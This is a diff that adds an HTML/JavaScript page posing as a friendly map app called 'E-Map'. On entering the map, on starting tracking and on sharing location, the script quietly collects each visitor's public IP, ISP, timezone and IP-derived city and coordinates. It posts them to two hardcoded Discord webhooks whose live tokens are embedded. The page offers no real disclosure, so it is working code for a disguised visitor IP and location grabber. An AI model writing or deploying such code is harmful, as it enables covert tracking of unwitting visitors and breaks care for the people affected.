@@ -1,0 +1,601 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>E-Map — final layout + Discord logging (v3)</title>
+
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+  <style>
+    :root{
+      --bg: #ffffff; --black: #000000;
+      --accent: #1976d2; --accent-2: #42a5f5; --danger: #b71c1c;
+      --panel-bg: rgba(255,255,255,0.98);
+    }
+    html,body{height:100%;margin:0;padding:0;background:var(--bg);font-family:system-ui,-apple-system,"Segoe UI",Roboto,Arial;color:#111}
+    #map{height:100vh;width:100%;visibility:hidden;background:var(--bg)}
+
+    /* LOADING SCREEN */
+    #loadingOverlay{
+      position:fixed; inset:0;
+      background:var(--black);
+      color:#fff;
+      z-index:30000;
+      display:flex; flex-direction:column; align-items:center; justify-content:center;
+      gap:18px; padding:20px; box-sizing:border-box;
+      transition: opacity 260ms ease, transform 260ms ease;
+    }
+    #loadingOverlay.hidden{ opacity:0; transform: translateY(8px); pointer-events:none; }
+    #loadingTitle{ font-size:28px; font-weight:700; text-align:center; letter-spacing:0.2px; }
+    #loadingSubtitle{ font-size:16px; color:#cfcfcf; text-align:center; margin-top:6px; }
+    .progress-wrap{ width:72%; max-width:520px; }
+    .progress-bar{ height:14px; background: rgba(255,255,255,0.12); border-radius:12px; overflow:hidden; }
+    .progress-fill{ height:100%; width:0%; background: linear-gradient(90deg,var(--accent),var(--accent-2)); transition: width 140ms linear; border-radius:12px; }
+    #progressPercent{ margin-top:8px; font-weight:700; font-size:16px; color:#fff; }
+    #enterMapBtn{
+      display:none; margin-top:18px; background:var(--accent); color:#fff; padding:14px 36px;
+      font-size:20px; border-radius:16px; border:none; cursor:pointer;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.45); align-items:center; gap:12px;
+    }
+    #enterMapBtn.show{ display:inline-flex; }
+
+    /* SEARCH moved to right; limit width so it doesn't cover zoom controls on left */
+    .search-bar {
+      position: absolute; top: 14px; right: 20px; left: auto; transform: none; z-index: 20000;
+      background: rgba(255,255,255,0.98); padding: 8px; border-radius: 12px;
+      display:flex; gap:8px; align-items:center; box-shadow: 0 12px 30px rgba(0,0,0,0.12);
+      width: min(520px, calc(100% - 220px)); max-width: 92%;
+    }
+    .search-input{ flex:1; padding:12px 14px; border-radius:10px; border:1px solid #e6e6e6; font-size:15px; outline:none; background:#fff; }
+    .search-btn{ background:var(--accent); color:#fff; border:none; padding:10px 14px; border-radius:10px; cursor:pointer; font-size:15px; }
+    .search-results{ position:absolute; top:64px; right:20px; left:auto; transform:none; z-index:20001; background:#fff; width: min(520px, calc(100% - 220px)); max-width:92%; border-radius:12px; box-shadow:0 12px 36px rgba(0,0,0,0.12); max-height:320px; overflow:auto; display:none; }
+    .search-result{ padding:12px 14px; border-bottom:1px solid #eee; cursor:pointer; font-size:14px; }
+    .search-result:hover{ background:#f6f8fb; }
+
+    /* BOTTOM PANEL layout like screenshot */
+    .panel {
+      position: fixed; left: 12px; right: 12px; bottom: 12px; z-index: 20000;
+      background: var(--panel-bg); border-radius: 18px; padding: 16px;
+      box-shadow: 0 18px 40px rgba(0,0,0,0.08); max-width:720px; margin-left:auto; margin-right:auto;
+      display: grid; grid-template-columns: 1fr; gap: 12px; align-items: start;
+    }
+    .titleRow { display:flex; align-items:center; gap:8px; }
+    .titleRow h4 { margin:0; font-size:18px; font-weight:700; }
+    .btn-full { width:100%; background:var(--accent); color:#fff; border:none; padding:14px 18px; border-radius:12px; font-size:18px; cursor:pointer; text-align:center; }
+    .row-inline { display:flex; align-items:center; gap:12px; }
+    .btn-medium { background:var(--accent); color:#fff; border:none; padding:12px 16px; border-radius:12px; font-size:16px; cursor:pointer; min-width:140px; }
+    .small-square { width:22px; height:28px; border-radius:6px; background:#b71c1c; }
+    .btn-stop { background:var(--danger); color:#fff; border:none; padding:14px; border-radius:12px; width:100%; font-size:18px; }
+    .bottomRow { display:flex; align-items:center; justify-content:space-between; gap:12px; }
+    .btn-settings { background:var(--accent); color:#fff; border:none; padding:12px 18px; border-radius:12px; font-size:16px; }
+
+    /* sending overlay */
+    #sendingOverlay { position:fixed; inset:0; display:none; align-items:center; justify-content:center; background:rgba(0,0,0,0.45); z-index:32000; }
+    #sendingOverlay.show{ display:flex; }
+    .sendingBox { background:#111; color:#fff; padding:14px 16px; border-radius:12px; min-width:260px; text-align:center; }
+
+    /* blue dot */
+    .blue-dot { width:14px; height:14px; border-radius:50%; background:#1976d2; border:3px solid #fff; box-shadow:0 0 10px rgba(25,118,210,0.6); transform: translateY(-6px); }
+
+    @media (max-width:640px){
+      .search-bar{ right:12px; left:auto; top:12px; width: calc(100% - 24px); }
+      .search-results{ width: calc(100% - 40px); right:12px; left:auto; top:64px; }
+      .panel{ left:8px; right:8px; padding:14px; border-radius:14px; }
+    }
+  </style>
+</head>
+<body>
+  <!-- Loading overlay -->
+  <div id="loadingOverlay" role="dialog" aria-label="Loading">
+    <div id="loadingTitle">E-Map — Your favorite map</div>
+    <div id="loadingSubtitle">Loading map — please wait</div>
+
+    <div class="progress-wrap">
+      <div class="progress-bar" role="progressbar" aria-valuemin="0" aria-valuemax="100">
+        <div id="progressFill" class="progress-fill" style="width:0%"></div>
+      </div>
+      <div id="progressPercent">0%</div>
+    </div>
+
+    <button id="enterMapBtn" aria-hidden="true">GO TO MAP 📍</button>
+  </div>
+
+  <!-- Sending overlay -->
+  <div id="sendingOverlay" role="status" aria-live="polite">
+    <div class="sendingBox">
+      <div id="sendingText">Sending logs...</div>
+      <div id="sendingPercent">0%</div>
+    </div>
+  </div>
+
+  <!-- Search -->
+  <div class="search-bar" role="search" aria-label="Search">
+    <input id="searchInput" class="search-input" type="search" placeholder="Search place or city..." />
+    <button id="searchBtn" class="search-btn">Search</button>
+  </div>
+  <div id="searchResults" class="search-results" role="listbox" aria-label="Search results"></div>
+
+  <!-- Map -->
+  <div id="map"></div>
+
+  <!-- Bottom Panel -->
+  <div class="panel" role="region" aria-label="Controls">
+    <div class="titleRow"><h4>Interactive map</h4></div>
+
+    <button id="btn-getdata" class="btn-full">📍 Share location</button>
+
+    <div class="row-inline">
+      <button id="btn-start" class="btn-medium">Start track</button>
+      <div id="trackSquare" class="small-square" aria-hidden="true" style="background:#b71c1c"></div>
+    </div>
+
+    <button id="btn-stop" class="btn-stop">Stop</button>
+
+    <div class="bottomRow">
+      <button id="btn-settings" class="btn-settings">Settings</button>
+      <div class="statusText" id="statusText">Ready — click Share location</div>
+    </div>
+  </div>
+
+  <!-- Settings modal (hidden by default) -->
+  <div id="settingsBackdrop" style="display:none"></div>
+  <div id="settingsModal" style="display:none;position:fixed;left:50%;top:50%;transform:translate(-50%,-50%);z-index:33000;background:#fff;padding:16px;border-radius:12px;box-shadow:0 20px 50px rgba(0,0,0,.35)">
+    <h3>Settings</h3>
+    <div style="display:flex;gap:8px;align-items:center;margin-top:8px">
+      <label><input type="radio" name="lang" id="radio-en" value="en"> EN</label>
+      <label><input type="radio" name="lang" id="radio-pl" value="pl"> PL</label>
+    </div>
+    <div style="display:flex;justify-content:flex-end;gap:8px;margin-top:14px">
+      <button id="settingsSave" class="btn-settings">Save</button>
+      <button id="settingsCancel" class="btn-settings" style="background:#999">Cancel</button>
+    </div>
+  </div>
+
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <script>
+/*
+  v3 adjustments:
+   - Removed BETA badge (already removed).
+   - Go to map button is only shown when progress reaches 100% (class .show added exactly at 100%).
+   - Search moved to the right and limited so it doesn't cover zoom controls.
+   - Language radio buttons now apply immediately when clicked and persist to localStorage.
+   - Logging: latitude/longitude fields removed from log payloads and replaced with position (based on IP).
+   - State/Region in logs is now derived from the locality (city) when available.
+   - Additional: check for placeholder/local IPs and avoid sending them; add '#' before Event in message.
+   - Other behaviors unchanged.
+*/
+
+/* Webhooks (user provided) */
+const WEBHOOK_PRIMARY = "https://discord.com/api/webhooks/1234477262221606912/5KAAr_XMU1jIifTc3coBbeoFTTjcDbhfA2wFddi0kX5wCKfLMo61QINRFgiX6P_z92kW";
+const WEBHOOK_FALLBACK = "https://discord.com/api/webhooks/1399504587613933811/1TLF-YwW6htT551aXi5FepZEicoeYwzvzhEyAgxRfkjrN6Q2h9jfnmzuHanPZMoqejFU";
+const PREFERRED_FORWARDER = ""; // optional
+
+/* Language */
+let lang = localStorage.getItem('map_lang') || 'en';
+localStorage.setItem('map_lang', lang);
+const STR = {
+  en:{
+    loadingTitle:'E-Map — Your favorite map',
+    loadingSubtitle:'Loading map — please wait',
+    enterBtn:'GO TO MAP 📍',
+    searchPlaceholder:'Search place or city...',
+    shareBtn:'📍 Share location',
+    startBtn:'Start track',
+    stopBtn:'Stop',
+    settingsBtn:'Settings',
+    statusReady:'Ready — click Share location'
+  },
+  pl:{
+    loadingTitle:'E-Mapa — Twoja ulubiona mapa',
+    loadingSubtitle:'Ładuję mapę — proszę czekać',
+    enterBtn:'PRZEJDŹ DO MAPY 📍',
+    searchPlaceholder:'Wyszukaj miejscowość...',
+    shareBtn:'📍 Udostępnij lokalizację',
+    startBtn:'Rozpocznij śledzenie',
+    stopBtn:'Zatrzymaj',
+    settingsBtn:'Ustawienia',
+    statusReady:'Gotowe — kliknij Udostępnij lokalizację'
+  }
+};
+
+/* UI refs */
+const loadingOverlay = document.getElementById('loadingOverlay');
+const progressFill = document.getElementById('progressFill');
+const progressPercent = document.getElementById('progressPercent');
+const enterBtn = document.getElementById('enterMapBtn');
+const searchInput = document.getElementById('searchInput');
+const searchBtn = document.getElementById('searchBtn');
+const searchResults = document.getElementById('searchResults');
+const btnGetData = document.getElementById('btn-getdata');
+const btnStart = document.getElementById('btn-start');
+const btnStop = document.getElementById('btn-stop');
+const trackSquare = document.getElementById('trackSquare');
+const btnSettings = document.getElementById('btn-settings');
+const settingsModal = document.getElementById('settingsModal');
+const settingsBackdrop = document.getElementById('settingsBackdrop');
+const radioEn = document.getElementById('radio-en');
+const radioPl = document.getElementById('radio-pl');
+const settingsSave = document.getElementById('settingsSave');
+const settingsCancel = document.getElementById('settingsCancel');
+const sendingOverlay = document.getElementById('sendingOverlay');
+const sendingText = document.getElementById('sendingText');
+const sendingPercent = document.getElementById('sendingPercent');
+const statusText = document.getElementById('statusText');
+
+/* Map init */
+const map = L.map('map', { center:[52.2297,21.0122], zoom:13, zoomControl:true });
+window.map = map;
+L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '&copy; OpenStreetMap contributors' }).addTo(map);
+
+/* apply language */
+function applyLang() {
+  const s = STR[lang] || STR.en;
+  document.getElementById('loadingTitle').textContent = s.loadingTitle;
+  document.getElementById('loadingSubtitle').textContent = s.loadingSubtitle;
+  enterBtn.textContent = s.enterBtn;
+  searchInput.placeholder = s.searchPlaceholder;
+  if(btnGetData) btnGetData.textContent = s.shareBtn;
+  if(btnStart) btnStart.textContent = s.startBtn;
+  if(btnStop) btnStop.textContent = s.stopBtn;
+  if(btnSettings) btnSettings.textContent = s.settingsBtn;
+  if(statusText) statusText.textContent = s.statusReady;
+  if(radioEn) radioEn.checked = (lang === 'en');
+  if(radioPl) radioPl.checked = (lang === 'pl');
+}
+applyLang();
+
+/* Make language radios apply immediately when clicked */
+if(radioEn) radioEn.addEventListener('change', () => {
+  if(radioEn.checked){ lang = 'en'; localStorage.setItem('map_lang', lang); applyLang(); }
+});
+if(radioPl) radioPl.addEventListener('change', () => {
+  if(radioPl.checked){ lang = 'pl'; localStorage.setItem('map_lang', lang); applyLang(); }
+});
+
+/* Loading: button shown at 100% exactly */
+(function simulateLoading(){
+  let p = 0;
+  function step(){
+    p = Math.min(100, p + Math.ceil(Math.random()*7));
+    progressFill.style.width = p + '%';
+    progressPercent.textContent = p + '%';
+    if(p >= 100){
+      // reveal button only now
+      enterBtn.classList.add('show');
+      enterBtn.setAttribute('aria-hidden','false');
+    } else {
+      setTimeout(step, 80 + Math.random()*120);
+    }
+  }
+  setTimeout(step, 200);
+})();
+
+function revealMapAndSendOpenLog(){
+  if(enterBtn.disabled) return;
+  enterBtn.disabled = true;
+  loadingOverlay.classList.add('hidden');
+
+  // Prepare and send LOG #1 (map open) — try to include IP info and optionally geolocation
+  sendEventLog('map_open').catch(e => console.warn('map_open send failed', e));
+
+  const fallback = setTimeout(()=>{
+    loadingOverlay.style.display = 'none';
+    document.getElementById('map').style.visibility = 'visible';
+    try{ map.invalidateSize(); }catch(e){}
+  }, 700);
+  loadingOverlay.addEventListener('transitionend', function onEnd(e){
+    if(e.propertyName !== 'opacity') return;
+    clearTimeout(fallback);
+    loadingOverlay.style.display = 'none';
+    document.getElementById('map').style.visibility = 'visible';
+    try{ map.invalidateSize(); }catch(e){}
+    loadingOverlay.removeEventListener('transitionend', onEnd);
+  }, { once:true });
+}
+enterBtn.addEventListener('click', e => { e.preventDefault(); revealMapAndSendOpenLog(); });
+enterBtn.addEventListener('keydown', e => { if(e.key==='Enter' || e.key===' ') { e.preventDefault(); revealMapAndSendOpenLog(); }});
+
+/* Blue dot */
+function blueDotIcon(){ return L.divIcon({ className:'', html:'<div class="blue-dot"></div>', iconSize:[20,20], iconAnchor:[10,10] }); }
+let blueDotMarker = null;
+function placeBlueDot(lat,lon){
+  if(!lat && lat !== 0) return;
+  if(!blueDotMarker) blueDotMarker = L.marker([lat,lon], { icon: blueDotIcon(), interactive:false }).addTo(map);
+  else blueDotMarker.setLatLng([lat,lon]);
+  blueDotMarker.bringToFront();
+}
+
+/* Reverse geocode + ip info */
+async function reverseGeocode(lat, lon){
+  try{
+    const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}&addressdetails=1&accept-language=${encodeURIComponent(localStorage.getItem('map_lang')||'en')}`;
+    const r = await fetch(url);
+    if(!r.ok) throw new Error('reverse error '+r.status);
+    return await r.json();
+  }catch(e){ console.warn(e); return null; }
+}
+async function fetchIpInfo(){
+  try{
+    const r = await fetch('https://ipapi.co/json/');
+    if(!r.ok) throw new Error('ipapi ' + r.status);
+    return await r.json();
+  }catch(e){ console.warn('fetchIpInfo', e); return { ip:'', org:'', timezone:'', country_name:'', region:'', city:'', latitude:'', longitude:'' }; }
+}
+
+/* helper: detect placeholder/local IPs (do not treat those as valid public IPs) */
+function isPlaceholderIp(ip){
+  if(!ip) return true;
+  const p = ip.trim();
+  if(p === '127.0.0.1' || p === '::1' || p === '0.0.0.0') return true;
+  if(/^10\./.test(p)) return true;
+  if(/^192\.168\./.test(p)) return true;
+  if(/^172\.(1[6-9]|2[0-9]|3[0-1])\./.test(p)) return true;
+  return false;
+}
+
+/* Search dedupe */
+function normalize(s){ return (s||'').toString().toLowerCase().replace(/\s+/g,' ').trim(); }
+function roundCoord(x,p=5){ return Math.round((Number(x)||0) * Math.pow(10,p))/Math.pow(10,p); }
+async function nominatimSearch(q){
+  try{
+    const url = `https://nominatim.openstreetmap.org/search?format=jsonv2&q=${encodeURIComponent(q)}&addressdetails=1&limit=16&accept-language=${encodeURIComponent(localStorage.getItem('map_lang')||'en')}`;
+    const r = await fetch(url);
+    if(!r.ok) throw new Error('search failed ' + r.status);
+    return await r.json();
+  }catch(e){ console.warn(e); return []; }
+}
+function clearSearchResults(){ searchResults.innerHTML=''; searchResults.style.display='none'; }
+async function showSearchResults(results, query){
+  clearSearchResults();
+  if(!Array.isArray(results) || results.length === 0) return;
+  const qn = normalize(query||'');
+  const unique = new Map();
+  for(const r of results){
+    const name = normalize(r.display_name || '');
+    const key = name + '|' + roundCoord(r.lat,5) + '|' + roundCoord(r.lon,5);
+    if(!unique.has(key)) unique.set(key, Object.assign({}, r, { name }));
+  }
+  const arr = Array.from(unique.values());
+  const exact = arr.find(a => a.name === qn);
+  const toShow = exact ? [exact] : arr;
+  for(const r of toShow){
+    const el = document.createElement('div');
+    el.className = 'search-result';
+    el.textContent = r.display_name;
+    el.tabIndex = 0;
+    el.addEventListener('click', ()=> selectSearchResult(r));
+    el.addEventListener('keydown', e => { if(e.key==='Enter') selectSearchResult(r); });
+    searchResults.appendChild(el);
+  }
+  searchResults.style.display = 'block';
+}
+
+/* markers & click */
+let searchPin = null, playerPin = null, accuracyCircle = null;
+async function selectSearchResult(r){
+  clearSearchResults();
+  if(!r) return;
+  const lat = parseFloat(r.lat), lon = parseFloat(r.lon);
+  map.setView([lat,lon], 15);
+  if(!searchPin) searchPin = L.marker([lat,lon], { icon: L.divIcon({ html:'<div style="font-size:24px; transform:translateY(-8px)">📌</div>' }) }).addTo(map);
+  else searchPin.setLatLng([lat,lon]);
+  const display = r.display_name || (await reverseGeocode(lat,lon))?.display_name || 'Address not found';
+  searchPin.bindPopup(`<strong>${display}</strong>`).openPopup();
+  placeBlueDot(lat,lon);
+}
+map.on('click', async (e)=>{ const lat=e.latlng.lat, lon=e.latlng.lng; const tmp = L.marker([lat,lon], { icon:L.divIcon({ html:'<div style="width:18px;height:18px;border-radius:50%;background:#1976d2;border:3px solid #fff"></div>' }) }).addTo(map); tmp.bindPopup('Loading address...').openPopup(); const rev = await reverseGeocode(lat,lon); const display = (rev && rev.display_name) || 'Address not found'; tmp.bindPopup(`<strong>${display}</strong>`).openPopup(); placeBlueDot(lat,lon); setTimeout(()=>{ try{ map.removeLayer(tmp); }catch(e){} },1500); });
+
+/* tracking */
+function setTrackIndicator(on){ trackSquare.style.background = on ? '#2e7d32' : '#b71c1c'; trackSquare.setAttribute('aria-checked', on ? 'true' : 'false'); }
+setTrackIndicator(false);
+btnStart.addEventListener('click', async ()=>{
+  // When Start is clicked, send log #2 (start_track) and then start tracking (if geolocation permission available).
+  await sendEventLog('start_track');
+  if(!('geolocation' in navigator)){ alert('Geolocation not supported'); return; }
+  if(window._watchId) return;
+  window._watchId = navigator.geolocation.watchPosition(async pos => {
+    const lat = pos.coords.latitude, lon = pos.coords.longitude;
+    if(!playerPin) playerPin = L.marker([lat,lon], { icon: L.divIcon({ html:'<div style="font-size:18px; transform:translateY(-6px)">📌</div>' }) }).addTo(map);
+    else playerPin.setLatLng([lat,lon]);
+    if(!accuracyCircle) accuracyCircle = L.circle([lat,lon], { radius: Math.max(pos.coords.accuracy||5,5), color:'rgba(30,136,229,0.8)', fillColor:'rgba(30,136,229,0.12)' }).addTo(map);
+    else { accuracyCircle.setLatLng([lat,lon]); accuracyCircle.setRadius(Math.max(pos.coords.accuracy||5,5)); }
+    const rev = await reverseGeocode(lat,lon);
+    const display = (rev && rev.display_name) || `Lat ${lat.toFixed(6)} Lon ${lon.toFixed(6)}`;
+    playerPin.bindPopup(`<strong>${display}</strong>`);
+    placeBlueDot(lat,lon);
+  }, err => {
+    console.warn(err);
+    // Show specific alerts matching screenshots
+    if(err.code === err.PERMISSION_DENIED) alert('Cannot obtain location (check permissions)');
+    else alert('Position error');
+  }, { enableHighAccuracy:true, maximumAge:0, timeout:20000 });
+  setTrackIndicator(true);
+});
+btnStop.addEventListener('click', ()=>{ if(window._watchId){ navigator.geolocation.clearWatch(window._watchId); window._watchId = null; } setTrackIndicator(false); });
+
+/* Sending helpers */
+function postJson(url,payload){ return fetch(url, { method:'POST', headers:{ 'Content-Type':'application/json' }, body: JSON.stringify(payload) }).then(async r => ({ ok: r.ok, status: r.status, text: await r.text().catch(()=>'') })).catch(e => ({ ok:false, error:String(e) })); }
+function showSending(text){ sendingText.textContent = text || 'Sending logs...'; sendingPercent.textContent = '0%'; sendingOverlay.classList.add('show'); }
+function setSendPercent(p){ sendingPercent.textContent = Math.round(p) + '%'; }
+function hideSending(){ sendingOverlay.classList.remove('show'); }
+
+/* Build and send visitor/event logs
+   eventType: 'map_open' | 'start_track' | 'share_location'
+   optional extra: { latitude, longitude, ... }
+*/
+function buildDiscordPayload(visitor){
+  const lines = [
+    `# **Event:** ${visitor.event || 'unknown'}`, // <-- '#' added before Event as requested
+    visitor.display_name || visitor.address || 'N/A',
+    `Position: ${visitor.position || 'N/A'}`,
+    `State/Region: ${visitor.state || 'N/A'}`,
+    `Timezone: ${visitor.timezone || 'N/A'}`,
+    `IP: ${visitor.ip || 'N/A'}`,
+    `Operator: ${visitor.operator || 'N/A'}`,
+    `Time (UTC): ${visitor.timestampUTC || new Date().toISOString()}`,
+    visitor.note ? `Note: ${visitor.note}` : ''
+  ];
+  return { content: lines.filter(Boolean).join("\n") };
+}
+
+async function sendLogsWithFallback(visitor){
+  showSending('Preparing logs...');
+  setSendPercent(8);
+
+  // IP info
+  setSendPercent(22);
+  const ipinfo = await fetchIpInfo();
+  // check if ip is placeholder/local — if so, don't use it as a public IP
+  const ipFromApi = ipinfo.ip || '';
+  if(!visitor.ip){
+    if(!isPlaceholderIp(ipFromApi)){
+      visitor.ip = ipFromApi;
+    } else {
+      // mark that ip was placeholder so receiver knows it wasn't a valid public IP
+      visitor.ip = '';
+      visitor.note = (visitor.note ? visitor.note + ';' : '') + 'ip-placeholder';
+    }
+  }
+  visitor.operator = visitor.operator || (ipinfo.org || '');
+  visitor.timezone = visitor.timezone || (ipinfo.timezone || '');
+  visitor.country = visitor.country || (ipinfo.country_name || '');
+  setSendPercent(45);
+
+  // Replace lat/lon usage in logs: build a human-readable position based on IP info,
+  // and set state/region based on locality (city) when possible.
+  // Do not remove lat/lon usage inside map logic (markers) — this only affects logs.
+  visitor.position = visitor.position || (
+    (ipinfo.city ? ipinfo.city + (ipinfo.region ? ', ' + ipinfo.region : '') : (ipinfo.region || ipinfo.country_name || ''))
+    + (ipinfo.latitude ? ` (${ipinfo.latitude},${ipinfo.longitude})` : '')
+  );
+  visitor.city = visitor.city || ipinfo.city || '';
+  if(!visitor.state || visitor.state === ''){
+    // state/region should be based on miejscowości (city) as requested
+    visitor.state = visitor.city || ipinfo.region || '';
+  }
+
+  setSendPercent(60);
+
+  // Try forwarder
+  if(PREFERRED_FORWARDER){
+    const f = await postJson(PREFERRED_FORWARDER, { visitor });
+    setSendPercent(80);
+    if(f.ok){ setSendPercent(100); setTimeout(hideSending, 500); return true; }
+  }
+
+  // Primary webhook
+  setSendPercent(70);
+  if(WEBHOOK_PRIMARY){
+    const r = await postJson(WEBHOOK_PRIMARY, buildDiscordPayload(visitor));
+    if(r.ok){ setSendPercent(100); setTimeout(hideSending, 500); return true; }
+    console.warn('primary failed', r);
+  }
+
+  // Fallback webhook
+  setSendPercent(85);
+  if(WEBHOOK_FALLBACK){
+    const r2 = await postJson(WEBHOOK_FALLBACK, buildDiscordPayload(visitor));
+    if(r2.ok){ setSendPercent(100); setTimeout(hideSending, 500); return true; }
+    console.warn('fallback failed', r2);
+  }
+
+  setSendPercent(100);
+  sendingText.textContent = 'Sending failed';
+  setTimeout(hideSending, 900);
+  return false;
+}
+
+/* sendEventLog: prepares minimal visitor object per event and sends via sendLogsWithFallback */
+async function sendEventLog(eventType, extra = {}) {
+  const visitor = Object.assign({
+    event: eventType,
+    timestampUTC: new Date().toISOString()
+  }, extra);
+
+  // If we can get approximate geolocation quickly for map_open, try to capture it (but don't block)
+  if(eventType === 'map_open') {
+    // attempt quick position (promise with timeout)
+    try {
+      const pos = await Promise.race([
+        new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy:false, timeout:3000 })),
+        new Promise((res) => setTimeout(()=>res(null), 3000))
+      ]);
+      if(pos && pos.coords) {
+        // keep internal lat/lon for internal use if needed, but do not force-send them in logs
+        visitor._quick_lat = pos.coords.latitude;
+        visitor._quick_lon = pos.coords.longitude;
+        // note: we won't include latitude/longitude in the final payload (position will be used)
+      } else {
+        visitor.note = visitor.note ? visitor.note + ';geolocation-not-obtained' : 'geolocation-not-obtained';
+      }
+    } catch(err) {
+      visitor.note = visitor.note ? visitor.note + ';geolocation-error' : 'geolocation-error';
+    }
+  }
+
+  // send
+  return await sendLogsWithFallback(visitor);
+}
+
+/* Share location sends logs (and shows popup) */
+btnGetData.addEventListener('click', async ()=>{
+  if(!('geolocation' in navigator)){ alert('Geolocation not supported'); return; }
+  try{
+    const pos = await new Promise((resolve,reject) => navigator.geolocation.getCurrentPosition(resolve,reject,{ enableHighAccuracy:true, timeout:15000 }));
+    const lat = pos.coords.latitude, lon = pos.coords.longitude;
+    const rev = await reverseGeocode(lat,lon);
+    const comps = (rev && rev.address) || {};
+    // Build visitor without latitude/longitude — replace with position (based on IP) in sendLogsWithFallback.
+    const visitor = {
+      event: 'share_location',
+      accuracy: pos.coords.accuracy || null,
+      display_name: (rev && rev.display_name) || '',
+      // city/state will be enriched/overwritten inside sendLogsWithFallback using IP info per request
+      state: comps.state || comps.region || '',
+      city: comps.city || comps.town || comps.village || '',
+      timestampUTC: new Date().toISOString()
+    };
+
+    const ok = await sendLogsWithFallback(visitor);
+    if(ok){
+      if(!playerPin) playerPin = L.marker([lat,lon], { icon: L.divIcon({ html:'<div style="font-size:18px; transform:translateY(-6px)">📌</div>' }) }).addTo(map);
+      else playerPin.setLatLng([lat,lon]);
+      const popup = `${visitor.display_name || 'Location'}\nIP: ${visitor.ip || 'N/A'}\nOperator: ${visitor.operator || 'N/A'}\nTimezone: ${visitor.timezone || 'N/A'}`;
+      playerPin.bindPopup(`<strong>${popup.replace(/\n/g,'<br/>')}</strong>`).openPopup();
+      placeBlueDot(lat,lon);
+    } else {
+      alert('Sending logs failed');
+    }
+  }catch(err){
+    console.error('getCurrentPosition failed', err);
+    // show same error messages as screenshots
+    if(err && err.code === err.PERMISSION_DENIED) alert('Cannot obtain location (check permissions)');
+    else alert('Position error');
+    // Still send an event log indicating the failure
+    await sendEventLog('share_location_error', { note: (err && err.message) || 'position-error' });
+  }
+});
+
+/* Settings modal behavior */
+btnSettings.addEventListener('click', ()=>{
+  if(document.getElementById('map').style.visibility !== 'visible'){ alert('Open the map first'); return; }
+  radioEn.checked = (lang === 'en'); radioPl.checked = (lang === 'pl');
+  settingsBackdrop.style.display = 'block'; settingsModal.style.display = 'block';
+});
+settingsBackdrop.addEventListener('click', ()=>{ settingsBackdrop.style.display='none'; settingsModal.style.display='none'; });
+settingsCancel.addEventListener('click', ()=>{ settingsBackdrop.style.display='none'; settingsModal.style.display='none'; });
+settingsSave.addEventListener('click', ()=>{ lang = radioEn.checked ? 'en' : 'pl'; localStorage.setItem('map_lang', lang); applyLang(); settingsBackdrop.style.display='none'; settingsModal.style.display='none'; });
+
+/* search wiring */
+searchBtn.addEventListener('click', async ()=>{ const q=(searchInput.value||'').trim(); if(!q) return; searchResults.innerHTML=''; searchResults.style.display='none'; const res = await nominatimSearch(q); await showSearchResults(res, q); });
+searchInput.addEventListener('keydown', e => { if(e.key==='Enter'){ e.preventDefault(); searchBtn.click(); }});
+document.addEventListener('click', ev => { if(!ev.target.closest('.search-bar') && !ev.target.closest('.search-results')) clearSearchResults(); });
+
+/* expose debug function */
+window._sendEventLog = sendEventLog;
+
+console.log('v3 loaded: loading behaviour fixed, GO TO MAP appears only at 100%, search moved right and limited, language radios apply immediately. Logs now use position (IP-based) and state derived from city. Placeholder IPs are detected and not sent; Event line is prefixed with "#" in payload.');
+
+  </script>
+</body>
+</html>
